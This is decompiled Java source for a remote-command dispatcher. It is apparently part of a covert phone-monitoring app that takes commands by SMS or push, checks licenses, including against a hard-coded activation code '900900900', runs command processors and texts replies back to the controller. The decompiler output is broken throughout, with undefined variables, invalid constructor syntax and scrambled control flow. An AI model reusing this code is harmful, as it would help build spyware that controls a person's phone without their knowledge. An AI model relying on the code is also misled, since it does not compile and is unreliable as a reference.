package com.vvt.remotecommand;

import com.vvt.ae.f;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxSystemEvent;
import com.vvt.events.FxSystemEventCategories;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.remotecommand.a.g;
import com.vvt.remotecommand.exception.CommandNotSupportedException;
import com.vvt.remotecommand.exception.LicenseExpiredException;
import com.vvt.remotecommand.exception.LiscenseDisableException;
import com.vvt.remotecommand.exception.ProductNotActivatedException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.exception.WrongActivationCodeException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.a.d;
import com.vvt.remotecontrol.RemoteControlException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class b
  implements com.vvt.remotecommand.processor.c
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.b;
  private static final boolean c = com.vvt.ak.a.c;
  private static final boolean d = com.vvt.ak.a.d;
  private com.vvt.base.a e;
  private Map f;
  private g g;
  private a h;
  private c i;
  private f j;
  private String k;
  private String l;
  private com.vvt.license.a m;
  private List n;
  
  b(c paramc, a parama, g paramg)
  {
    this.i = paramc;
    this.h = parama;
    this.g = paramg;
    this.k = "[PID Version]";
  }
  
  public b(String paramString)
  {
    this(localc, locala, localg);
  }
  
  private void a(boolean paramBoolean, RemoteCommand paramRemoteCommand)
  {
    Object localObject1 = this.f;
    boolean bool1;
    if (localObject1 != null)
    {
      localObject1 = this.f.keySet();
      localObject2 = paramRemoteCommand.getCode();
      bool1 = ((Set)localObject1).contains(localObject2);
      if (bool1) {
        bool1 = true;
      }
    }
    for (;;)
    {
      localObject2 = this.m.a();
      boolean bool2 = b;
      if (bool2) {}
      bool2 = a;
      if ((bool2) && (!paramBoolean)) {
        break label169;
      }
      localLicenseStatus1 = ((LicenseInfo)localObject2).getLicenseStatus();
      LicenseStatus localLicenseStatus2 = LicenseStatus.EXPIRED;
      if (localLicenseStatus1 != localLicenseStatus2) {
        break;
      }
      if (bool1) {
        return;
      }
      localObject1 = new com/vvt/remotecommand/exception/LicenseExpiredException;
      ((LicenseExpiredException)localObject1).<init>();
      throw ((Throwable)localObject1);
      bool1 = false;
      localObject1 = null;
    }
    Object localObject2 = ((LicenseInfo)localObject2).getLicenseStatus();
    LicenseStatus localLicenseStatus1 = LicenseStatus.DISABLED;
    if (localObject2 == localLicenseStatus1)
    {
      if (!bool1)
      {
        localObject1 = new com/vvt/remotecommand/exception/LiscenseDisableException;
        ((LiscenseDisableException)localObject1).<init>();
        throw ((Throwable)localObject1);
      }
    }
    else if (!bool1)
    {
      localObject1 = new com/vvt/remotecommand/exception/CommandNotSupportedException;
      ((CommandNotSupportedException)localObject1).<init>();
      throw ((Throwable)localObject1);
      label169:
      if (!bool1)
      {
        localObject1 = new com/vvt/remotecommand/exception/ProductNotActivatedException;
        ((ProductNotActivatedException)localObject1).<init>();
        throw ((Throwable)localObject1);
      }
    }
  }
  
  private void b(RemoteCommand paramRemoteCommand)
  {
    ArrayList localArrayList = paramRemoteCommand.getParameters();
    int i1 = localArrayList.size();
    if (i1 > 0) {}
    for (Object localObject = (String)localArrayList.get(0);; localObject = null)
    {
      boolean bool2 = b;
      if (bool2) {}
      str = this.l;
      if (str != null)
      {
        str = this.l.trim();
        int i2 = str.length();
        if (i2 != 0) {
          break;
        }
      }
      localObject = new com/vvt/remotecommand/exception/ProductNotActivatedException;
      ((ProductNotActivatedException)localObject).<init>();
      throw ((Throwable)localObject);
      i1 = 0;
    }
    String str = this.l;
    boolean bool1 = str.equals(localObject);
    if (!bool1)
    {
      localObject = new com/vvt/remotecommand/exception/WrongActivationCodeException;
      ((WrongActivationCodeException)localObject).<init>();
      throw ((Throwable)localObject);
    }
    localArrayList.remove(0);
  }
  
  public void a()
  {
    boolean bool1 = a;
    if (bool1) {}
    this.i.b();
    Object localObject = this.i;
    ArrayList localArrayList = ((c)localObject).a();
    int i1;
    for (int i2 = 0;; i2 = i1)
    {
      i1 = localArrayList.size();
      if (i2 >= i1) {
        break;
      }
      localObject = (RemoteCommand)localArrayList.get(i2);
      a((RemoteCommand)localObject, false);
      i1 = i2 + 1;
    }
    boolean bool2 = a;
    if (bool2) {}
  }
  
  public void a(f paramf)
  {
    this.j = paramf;
  }
  
  public void a(com.vvt.base.a parama)
  {
    this.e = parama;
  }
  
  public void a(com.vvt.license.a parama)
  {
    this.m = parama;
  }
  
  void a(RemoteCommand.Type paramType, FxEventDirection paramFxEventDirection, String paramString)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = this.e;
    Object localObject2;
    if (localObject1 != null)
    {
      localObject1 = new com/vvt/events/FxSystemEvent;
      ((FxSystemEvent)localObject1).<init>();
      ((FxSystemEvent)localObject1).setDirection(paramFxEventDirection);
      long l1 = System.currentTimeMillis();
      ((FxSystemEvent)localObject1).setEventTime(l1);
      localObject2 = RemoteCommand.Type.PCC;
      if (paramType == localObject2)
      {
        localObject2 = FxEventDirection.IN;
        if (paramFxEventDirection == localObject2)
        {
          localObject2 = FxSystemEventCategories.CATEGORY_PCC;
          ((FxSystemEvent)localObject1).setLogType((FxSystemEventCategories)localObject2);
          localObject2 = FxEventDirection.OUT;
          if (paramFxEventDirection == localObject2)
          {
            localObject2 = "%s%s";
            int i1 = 2;
            Object[] arrayOfObject = new Object[i1];
            String str = this.k;
            arrayOfObject[0] = str;
            int i2 = 1;
            arrayOfObject[i2] = paramString;
            paramString = String.format((String)localObject2, arrayOfObject);
          }
          boolean bool2 = b;
          if (bool2) {}
          ((FxSystemEvent)localObject1).setMessage(paramString);
          localObject2 = new java/util/ArrayList;
          ((ArrayList)localObject2).<init>();
          ((ArrayList)localObject2).add(localObject1);
          localObject1 = this.e;
          ((com.vvt.base.a)localObject1).a((List)localObject2);
        }
      }
    }
    for (;;)
    {
      bool1 = a;
      if (bool1) {}
      return;
      localObject2 = FxEventDirection.OUT;
      if (paramFxEventDirection != localObject2) {
        break;
      }
      localObject2 = FxSystemEventCategories.CATEGORY_PCC_REPLY;
      ((FxSystemEvent)localObject1).setLogType((FxSystemEventCategories)localObject2);
      break;
      localObject2 = RemoteCommand.Type.PUSH;
      if (paramType == localObject2)
      {
        localObject2 = FxEventDirection.IN;
        if (paramFxEventDirection == localObject2)
        {
          localObject2 = FxSystemEventCategories.CATEGORY_PUSH_CMD;
          ((FxSystemEvent)localObject1).setLogType((FxSystemEventCategories)localObject2);
          break;
        }
        localObject2 = FxEventDirection.OUT;
        if (paramFxEventDirection != localObject2) {
          break;
        }
        localObject2 = FxSystemEventCategories.CATEGORY_PUSH_CMD_REPLY;
        ((FxSystemEvent)localObject1).setLogType((FxSystemEventCategories)localObject2);
        break;
      }
      localObject2 = FxEventDirection.IN;
      if (paramFxEventDirection == localObject2)
      {
        localObject2 = FxSystemEventCategories.CATEGORY_SMS_CMD;
        ((FxSystemEvent)localObject1).setLogType((FxSystemEventCategories)localObject2);
        break;
      }
      localObject2 = FxEventDirection.OUT;
      if (paramFxEventDirection != localObject2) {
        break;
      }
      localObject2 = FxSystemEventCategories.CATEGORY_SMS_CMD_REPLY;
      ((FxSystemEvent)localObject1).setLogType((FxSystemEventCategories)localObject2);
      break;
      bool1 = d;
      if (!bool1) {}
    }
  }
  
  public void a(RemoteCommand paramRemoteCommand)
  {
    boolean bool = a;
    if (bool) {}
    RemoteCommand.Type localType = paramRemoteCommand.getType();
    FxEventDirection localFxEventDirection = FxEventDirection.IN;
    String str = paramRemoteCommand.getData();
    a(localType, localFxEventDirection, str);
    a(paramRemoteCommand, true);
    bool = a;
    if (bool) {}
  }
  
  public void a(RemoteCommand paramRemoteCommand, RemoteCommandProcessor paramRemoteCommandProcessor)
  {
    boolean bool = a;
    if (bool) {}
    bool = a;
    if (bool) {}
    c localc = this.i;
    String str = paramRemoteCommand.getCode();
    localc.a(str);
    bool = a;
    if (bool) {}
  }
  
  public void a(RemoteCommand paramRemoteCommand, RemoteCommandProcessor paramRemoteCommandProcessor, RemoteCommandException paramRemoteCommandException)
  {
    boolean bool = a;
    if (bool) {}
    bool = b;
    if (bool) {}
    String str1 = paramRemoteCommand.getCode();
    int i1 = 2;
    Object localObject1 = new Object[i1];
    localObject1[0] = str1;
    int i2 = 1;
    String str2 = paramRemoteCommandException.getMessage();
    localObject1[i2] = str2;
    Object localObject2 = String.format("[%s] Error\n%s", (Object[])localObject1);
    localObject1 = paramRemoteCommand.getType();
    FxEventDirection localFxEventDirection = FxEventDirection.OUT;
    a((RemoteCommand.Type)localObject1, localFxEventDirection, (String)localObject2);
    b(paramRemoteCommand, (String)localObject2);
    localObject2 = this.i;
    ((c)localObject2).a(str1);
    bool = a;
    if (bool) {}
  }
  
  public void a(RemoteCommand paramRemoteCommand, RemoteCommandProcessor paramRemoteCommandProcessor, String paramString)
  {
    int i1 = 1;
    boolean bool = a;
    if (bool) {}
    bool = b;
    if (bool) {}
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    Object localObject2 = new Object[i1];
    String str = paramRemoteCommand.getCode();
    localObject2[0] = str;
    Object localObject3 = String.format("[%s] OK\n", (Object[])localObject2);
    ((StringBuilder)localObject1).append((String)localObject3);
    if (paramString == null)
    {
      localObject2 = new Object[i1];
      str = paramRemoteCommandProcessor.e();
      localObject2[0] = str;
      localObject3 = String.format("%s command is being processed. You will receive the result when it is complete.", (Object[])localObject2);
      ((StringBuilder)localObject1).append((String)localObject3);
    }
    for (;;)
    {
      localObject1 = ((StringBuilder)localObject1).toString();
      localObject3 = paramRemoteCommand.getType();
      localObject2 = FxEventDirection.OUT;
      a((RemoteCommand.Type)localObject3, (FxEventDirection)localObject2, (String)localObject1);
      b(paramRemoteCommand, (String)localObject1);
      bool = a;
      if (bool) {}
      return;
      ((StringBuilder)localObject1).append(paramString);
    }
  }
  
  void a(RemoteCommand paramRemoteCommand, String paramString)
  {
    boolean bool = a;
    if (bool) {}
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    Object localObject2 = paramRemoteCommand.getCode();
    if (localObject2 != null)
    {
      localObject2 = ((String)localObject2).trim();
      int i1 = ((String)localObject2).length();
      if (i1 > 0)
      {
        int i2 = 1;
        localObject3 = new Object[i2];
        String str = paramRemoteCommand.getCode();
        localObject3[0] = str;
        localObject2 = String.format("[%s] Error\n", (Object[])localObject3);
        ((StringBuilder)localObject1).append((String)localObject2);
      }
    }
    localObject1 = " " + paramString;
    localObject2 = paramRemoteCommand.getType();
    Object localObject3 = FxEventDirection.OUT;
    a((RemoteCommand.Type)localObject2, (FxEventDirection)localObject3, (String)localObject1);
    b(paramRemoteCommand, (String)localObject1);
    bool = a;
    if (bool) {}
  }
  
  void a(RemoteCommand paramRemoteCommand, boolean paramBoolean)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1;
    boolean bool3;
    for (;;)
    {
      try
      {
        bool1 = a;
        if (bool1) {}
        paramRemoteCommand.analyze();
        localObject1 = paramRemoteCommand.getCode();
        bool1 = b;
        if (bool1) {}
        bool1 = b;
        if (bool1) {}
        localObject2 = this.l;
        if (localObject2 != null)
        {
          localObject2 = this.l;
          localObject2 = ((String)localObject2).trim();
          int i1 = ((String)localObject2).length();
          if (i1 != 0)
          {
            localObject2 = this.l;
            localObject4 = "900900900";
            bool2 = ((String)localObject2).equalsIgnoreCase((String)localObject4);
            if (!bool2)
            {
              bool2 = true;
              bool3 = bool2;
              a(bool3, paramRemoteCommand);
              bool2 = a;
              if (bool2) {}
              bool2 = false;
              localObject2 = null;
            }
          }
        }
      }
      catch (Exception localException)
      {
        Object localObject2;
        bool3 = b;
        if (bool3) {}
        localObject4 = localException.getMessage();
        bool4 = localException instanceof RemoteCommandException;
        if (!bool4) {}
      }
      try
      {
        localObject2 = b();
      }
      catch (RemoteControlException localRemoteControlException)
      {
        for (;;)
        {
          Object localObject5;
          List localList;
          break;
          Object localObject3 = localObject4;
        }
      }
      if (localObject2 != null) {
        break;
      }
      localObject2 = new com/vvt/remotecommand/exception/RemoteCommandException;
      localObject4 = "Internal error, remote control is not available!!";
      ((RemoteCommandException)localObject2).<init>((String)localObject4);
      throw ((Throwable)localObject2);
      localObject3 = ((RemoteCommandException)localException).getMessage();
      a(paramRemoteCommand, (String)localObject3);
      boolean bool2 = a;
      if (bool2) {}
      return;
      bool2 = false;
      localObject3 = null;
      bool3 = false;
      localObject4 = null;
    }
    localObject5 = this.h;
    localList = this.n;
    localObject3 = ((a)localObject5).a((String)localObject1, (com.vvt.remotecontrol.a)localObject3, localList);
    boolean bool4 = b;
    if ((!bool4) || (localObject3 == null))
    {
      localObject3 = new java/lang/Exception;
      localObject4 = "Command processor not found!!";
      ((Exception)localObject3).<init>((String)localObject4);
      throw ((Throwable)localObject3);
    }
    bool4 = ((RemoteCommandProcessor)localObject3).f();
    if (bool4)
    {
      localObject1 = paramRemoteCommand.getType();
      localObject5 = RemoteCommand.Type.SMS_COMMAND;
      if (localObject1 == localObject5)
      {
        bool4 = localObject3 instanceof d;
        if (!bool4) {
          break label416;
        }
        if (bool3) {
          b(paramRemoteCommand);
        }
      }
    }
    label338:
    if (paramBoolean)
    {
      localObject4 = this.i;
      ((c)localObject4).a(paramRemoteCommand);
      bool3 = b;
      if (!bool3) {}
    }
    for (;;)
    {
      localObject4 = this.g;
      localObject4 = ((g)localObject4).a((RemoteCommandProcessor)localObject3, paramRemoteCommand);
      localObject1 = new com/vvt/remotecommand/a/a;
      ((com.vvt.remotecommand.a.a)localObject1).<init>(paramRemoteCommand, (RemoteCommandProcessor)localObject3);
      ((com.vvt.remotecommand.a.b)localObject4).a((com.vvt.remotecommand.a.a)localObject1);
      ((com.vvt.remotecommand.a.b)localObject4).a(this);
      break;
      label416:
      b(paramRemoteCommand);
      break label338;
      bool3 = b;
      if (!bool3) {}
    }
  }
  
  public void a(String paramString)
  {
    boolean bool = c;
    if (bool) {}
    this.l = paramString;
  }
  
  public void a(String paramString1, String paramString2)
  {
    Object[] arrayOfObject = new Object[2];
    arrayOfObject[0] = paramString1;
    arrayOfObject[1] = paramString2;
    String str = String.format("[%s %s]", arrayOfObject);
    this.k = str;
  }
  
  public void a(List paramList)
  {
    boolean bool = c;
    if (bool) {}
    bool = c;
    if (bool) {}
    this.n = paramList;
  }
  
  public void a(Map paramMap)
  {
    boolean bool = c;
    if (bool) {}
    bool = c;
    if (bool) {}
    this.f = paramMap;
  }
  
  com.vvt.remotecontrol.a b()
  {
    return com.vvt.remotecontrol.b.a();
  }
  
  public void b(RemoteCommand paramRemoteCommand, RemoteCommandProcessor paramRemoteCommandProcessor, String paramString)
  {
    int i1 = 1;
    boolean bool = a;
    if (bool) {}
    bool = b;
    if (bool) {}
    String str1 = paramRemoteCommand.getCode();
    Object localObject1 = new java/lang/StringBuilder;
    ((StringBuilder)localObject1).<init>();
    Object localObject2 = new Object[i1];
    localObject2[0] = str1;
    Object localObject3 = String.format("[%s] OK\n", (Object[])localObject2);
    ((StringBuilder)localObject1).append((String)localObject3);
    if (paramString == null)
    {
      localObject2 = new Object[i1];
      String str2 = paramRemoteCommandProcessor.e();
      localObject2[0] = str2;
      localObject3 = String.format("%s command is complete.", (Object[])localObject2);
      ((StringBuilder)localObject1).append((String)localObject3);
    }
    for (;;)
    {
      localObject1 = ((StringBuilder)localObject1).toString();
      localObject3 = paramRemoteCommand.getType();
      localObject2 = FxEventDirection.OUT;
      a((RemoteCommand.Type)localObject3, (FxEventDirection)localObject2, (String)localObject1);
      b(paramRemoteCommand, (String)localObject1);
      localObject1 = this.i;
      ((c)localObject1).a(str1);
      bool = a;
      if (bool) {}
      return;
      ((StringBuilder)localObject1).append(paramString);
    }
  }
  
  void b(RemoteCommand paramRemoteCommand, String paramString)
  {
    boolean bool1 = paramRemoteCommand.isReplyMesageRequired();
    if (bool1)
    {
      str1 = paramRemoteCommand.getRecipient();
      if (str1 != null) {
        break label97;
      }
    }
    label97:
    for (String str1 = paramRemoteCommand.getSender();; str1 = paramRemoteCommand.getRecipient())
    {
      boolean bool2 = b;
      if ((!bool2) || (str1 != null))
      {
        int i1 = 2;
        Object localObject = new Object[i1];
        String str2 = this.k;
        localObject[0] = str2;
        int i2 = 1;
        localObject[i2] = paramString;
        String str3 = String.format("%s%s", (Object[])localObject);
        localObject = this.j;
        ((f)localObject).a(str1, str3);
      }
      return;
    }
  }
  
  public void c()
  {
    this.i.c();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/remotecommand/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */